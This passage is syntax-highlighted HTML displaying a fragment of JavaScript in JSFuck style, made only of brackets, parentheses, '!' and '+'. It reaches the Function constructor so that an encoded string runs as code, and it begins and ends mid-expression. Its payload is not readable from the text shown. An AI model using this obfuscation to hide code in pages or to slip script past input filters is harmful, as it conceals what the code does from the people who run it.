[])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]][([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ((<span style="color:#555">+</span>[])[([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]]]](<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]]) <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]])()([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]][([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]]((<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([]<span style="color:#555">+</span> [])[(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]]()[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]]] <span style="color:#555">+</span> ((<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]])[(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">+</span>(<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> [<span style="color:#555">+!+</span>[]]))[(<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([]<span style="color:#555">+</span> [])[([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]]][([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ((<span style="color:#555">+</span>[])[([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]])[<span style="color:#555">+!+</span>[]<span style="color:#555">+</span> [<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> ([][[]]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> ([][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]]] <span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[] <span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!!</span>[]<span style="color:#555">+</span> [][(<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">+</span>[]] <span style="color:#555">+</span> (<span style="color:#555">!</span>[]<span style="color:#555">+</span> [])[<span style="color:#555">!+</span>[]<span style="color:#555">+</span>  <span style="color:#555">!+</span>[]] <span style="color:#555">+</span> (<span 